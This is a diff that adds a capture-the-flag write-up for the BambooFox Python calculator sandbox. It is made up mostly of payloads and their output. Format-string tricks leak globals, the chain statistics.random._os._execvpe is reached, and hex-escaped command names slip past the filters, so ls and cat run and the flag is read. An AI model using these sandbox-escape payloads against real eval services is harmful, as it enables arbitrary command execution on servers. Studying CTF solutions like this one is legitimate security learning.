@@ -1,0 +1,51 @@
+nc chall.ctf.bamboofox.tw 1337
+
+("{" + '0.{1}{2}{0}{3}{4}{5}{6}{7}.f_globals'.format('_', 'g', 'i', 'f', 'r','a','m','e') + "}")
+	{0.gi_frame.f_globals}
+
+("{" + '0.{1}{2}{0}{3}{4}{5}{6}{7}.f_globals'.format('_', 'g', 'i', 'f', 'r','a','m','e') + "}").format((i for i in []))
+	{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7fdd787e1190>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/home/calc/calculate.py', '__cached__': None, 'resource': <module 'resource' from '/usr/local/lib/python3.8/lib-dynload/resource.cpython-3
+
+Output 512 characters at most
+
+("{" + '0.{1}{2}{0}{3}{4}{5}{6}{7}.f_globals'.format('_', 'g', 'i', 'f', 'r','a','m','e') + "}").format((i for i in []))[388:]
+	38-x86_64-linux-gnu.so'>, 'sys': <module 'sys' (built-in)>, 'math': <module 'math' from '/usr/local/lib/python3.8/lib-dynload/math.cpython-38-x86_64-linux-gnu.so'>, 'datetime': <module 'datetime' from '/usr/local/lib/python3.8/datetime.py'>, 'statistics': <module 'statistics' from '/usr/local/lib/python3.8/statistics.py'>, 'res_limits': resource.struct_rusage(ru_utime=0.122027, ru
+
+Modules
+	math, datetime, statistics are available
+
+statistics module chain
+	https://github.com/python/cpython/blob/3.9/Lib/statistics.py
+		import random
+	https://github.com/python/cpython/blob/3.9/Lib/random.py
+		import os as _os
+	https://github.com/python/cpython/blob/3.9/Lib/os.py
+		def _execvpe(file, args, env=None):
+
+	=> statistics.random._os._execvpe
+
+
+# ls -l
+statistics.random._os._execvpe("l"+"s", ["-l"])
+	binbootdevetcflag_6a8a824164f91591d05505c619f06e82homeliblib64mediamntoptprocrootrunsbinsrvsystmpusrva
+
+# pwd
+statistics.random._os._execvpe("\x70\x77\x64", ["-P"], {})
+	/
+
+# file -b flag_6a8a824164f91591d05505c619f06e82
+statistics.random._os._execvpe("\x66\x69\x6c\x65", ["-b", "flag_6a8a824164f91591d05505c619f06e82"], {})
+	ASCII text, with no line terminators
+
+# cat -A flag_6a8a824164f91591d05505c619f06e82
+statistics.random._os._execvpe("\x63\x61\x74", ["-A", "flag_6a8a824164f91591d05505c619f06e82"], {})
+	FLAG{yet-an0th3r-pyth0n-s4ndb0x}
+
+
+#################### Other solutions ####################
+Official
+	# /bin/cat c flag_6a8a824164f91591d05505c619f06e82
+	statistics.random._os._execvpe('/b'+'i'+'n/'+'c'+'a'+'t',['c','f'+'l'+'a'+'g'+'_'+'6'+'a'+'8'+'a'+'8'+'2'+'4'+'1'+'6'+'4'+'f'+'9'+'1'+'5'+'9'+'1'+'d'+'0'+'5'+'5'+'0'+'5'+'c'+'6'+'1'+'9'+'f'+'0'+'6'+'e'+'8'+'2'])
+
+Find builtin modules
+	"{q[0].gi_fr\x61me.f_globals}".format(q=[(i for i in [1,])])
